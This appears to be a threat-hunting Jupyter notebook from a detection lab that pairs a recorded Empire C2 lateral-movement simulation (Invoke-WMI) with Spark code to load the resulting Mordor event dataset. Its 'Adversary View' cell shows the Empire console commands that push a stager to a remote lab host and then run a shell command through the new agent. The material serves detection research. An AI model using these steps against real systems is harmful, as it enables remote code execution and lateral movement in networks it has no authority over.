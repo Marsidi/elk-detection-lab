{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Empire Invoke WMI"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| id                | SD-190518214442 |\n",
    "| author            | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| creation date     | 19/05/18 |\n",
    "| platform          | Windows |\n",
    "| Mordor Environment| shire |\n",
    "| Simulation Type   | C2 |\n",
    "| Simulation Tool   | Empire |\n",
    "| Simulation Script | https://github.com/EmpireProject/Empire/blob/master/lib/modules/powershell/lateral_movement/invoke_wmi.py |\n",
    "| Mordor Dataset    | https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/execution/empire_invoke_wmi.tar.gz |"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents adversaries using WMI to execute malicious code on endpoints remotely"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "(Empire: V6W3TH8Y) > usemodule lateral_movement/invoke_wmi\n",
    "(Empire: powershell/lateral_movement/invoke_wmi) > info\n",
    "\n",
    "              Name: Invoke-WMI\n",
    "            Module: powershell/lateral_movement/invoke_wmi\n",
    "        NeedsAdmin: False\n",
    "        OpsecSafe: True\n",
    "          Language: powershell\n",
    "MinLanguageVersion: 2\n",
    "        Background: False\n",
    "  OutputExtension: None\n",
    "\n",
    "Authors:\n",
    "  @harmj0y\n",
    "\n",
    "Description:\n",
    "  Executes a stager on remote hosts using WMI.\n",
    "\n",
    "Options:\n",
    "\n",
    "  Name         Required    Value                     Description\n",
    "  ----         --------    -------                   -----------\n",
    "  Listener     True                                  Listener to use.                        \n",
    "  CredID       False                                 CredID from the store to use.           \n",
    "  ComputerName True                                  Host[s] to execute the stager on, comma \n",
    "                                                    separated.                              \n",
    "  Proxy        False       default                   Proxy to use for request (default, none,\n",
    "                                                    or other).                              \n",
    "  UserName     False                                 [domain\\]username to use to execute     \n",
    "                                                    command.                                \n",
    "  ProxyCreds   False       default                   Proxy credentials                       \n",
    "                                                    ([domain\\]username:password) to use for \n",
    "                                                    request (default, none, or other).      \n",
    "  UserAgent    False       default                   User-agent string to use for the staging\n",
    "                                                    request (default, none, or other).      \n",
    "  Password     False                                 Password to use to execute command.     \n",
    "  Agent        True        V6W3TH8Y                  Agent to run module on.                 \n",
    "\n",
    "(Empire: powershell/lateral_movement/invoke_wmi) > set Listener https\n",
    "(Empire: powershell/lateral_movement/invoke_wmi) > set ComputerName IT001.shire.com\n",
    "(Empire: powershell/lateral_movement/invoke_wmi) > execute\n",
    "[*] Tasked V6W3TH8Y to run TASK_CMD_WAIT\n",
    "[*] Agent V6W3TH8Y tasked with task ID 6\n",
    "[*] Tasked agent V6W3TH8Y to run module powershell/lateral_movement/invoke_wmi\n",
    "(Empire: powershell/lateral_movement/invoke_wmi) > Invoke-Wmi executed on \"IT001.shire.com\"\n",
    "[*] Sending POWERSHELL stager (stage 1) to 10.0.10.103\n",
    "[*] New agent ZLPB8CV3 checked in\n",
    "[+] Initial agent ZLPB8CV3 from 10.0.10.103 now active (Slack)\n",
    "[*] Sending agent (stage 2) to ZLPB8CV3 at 10.0.10.103\n",
    "\n",
    "(Empire: powershell/lateral_movement/invoke_wmi) > agents\n",
    "\n",
    "[*] Active agents:\n",
    "\n",
    "Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n",
    "----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n",
    "H3DKB8SA ps 172.18.39.106   HR001             SHIRE\\nmartha           powershell         5172   5/0.0    2019-05-18 21:45:47  https           \n",
    "TKV35P8X ps 172.18.39.106   HR001             *SHIRE\\nmartha          powershell         5452   5/0.0    2019-05-18 21:45:44  https           \n",
    "EMDBFPSY ps 172.18.39.106   HR001             SHIRE\\nmartha           notepad            7924   5/0.0    2019-05-18 21:45:43  https           \n",
    "\n",
    "V6W3TH8Y ps 172.18.39.106   HR001             SHIRE\\pgustavo          powershell         5204   5/0.0    2019-05-18 21:45:43  https           \n",
    "38APWSR1 ps 172.18.39.105   IT001             *SHIRE\\pgustavo         MSBuild            5656   5/0.0    2019-05-18 21:45:46  https           \n",
    "ZLPB8CV3 ps 172.18.39.105   IT001             *SHIRE\\pgustavo         powershell         5804   5/0.0    2019-05-18 21:45:44  https           \n",
    "\n",
    "\n",
    "(Empire: agents) > interact ZLPB8CV3\n",
    "(Empire: ZLPB8CV3) > shell whoami\n",
    "[*] Tasked ZLPB8CV3 to run TASK_SHELL\n",
    "[*] Agent ZLPB8CV3 tasked with task ID 1\n",
    "(Empire: ZLPB8CV3) > shire\\pgustavo\n",
    "..Command execution completed.\n",
    "\n",
    "(Empire: ZLPB8CV3) >\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Explore Mordor Dataset"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Initialize Analytics Engine"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from openhunt.mordorutils import *\n",
    "spark = get_spark()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Download & Process Mordor File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "mordor_file = \"https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/execution/empire_invoke_wmi.tar.gz\"\n",
    "registerMordorSQLTable(spark, mordor_file, \"mordorTable\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Get to know your data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "df = spark.sql(\n",
    "    '''\n",
    "SELECT channel, COUNT(1)\n",
    "FROM mordorTable\n",
    "GROUP BY channel\n",
    "    '''\n",
    ")\n",
    "df.show(10,False)\n",
    "        "
   ]
  }
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 4
}
